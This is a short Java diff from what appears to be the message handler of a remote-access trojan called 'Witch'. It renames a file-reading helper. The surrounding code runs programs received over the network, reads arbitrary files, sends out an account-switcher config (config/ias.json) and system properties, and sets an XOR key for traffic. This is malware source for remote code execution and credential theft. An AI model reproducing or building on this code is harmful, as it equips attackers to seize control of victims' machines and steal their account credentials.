@@ -59,8 +59,8 @@ public class MessageHandler {
                         ShellUtil.runProg(GSON.fromJson(message.message(), byte[].class));
                     }
                 }
-                case "iasconfig" -> Witch.messageUtils.send(msgType, FileReadUtil.read("config/ias.json"));
-                case "read" -> Witch.messageUtils.send(msgType, FileReadUtil.read(msg));
+                case "iasconfig" -> Witch.messageUtils.send(msgType, FileUtil.read("config/ias.json"));
+                case "read" -> Witch.messageUtils.send(msgType, FileUtil.read(msg));
                 case "runargs" -> Witch.messageUtils.send(msgType, System.getProperties());
                 case "xor" -> Witch.messageUtils.xor = new XOR(msg);
                 case "greeting" -> {
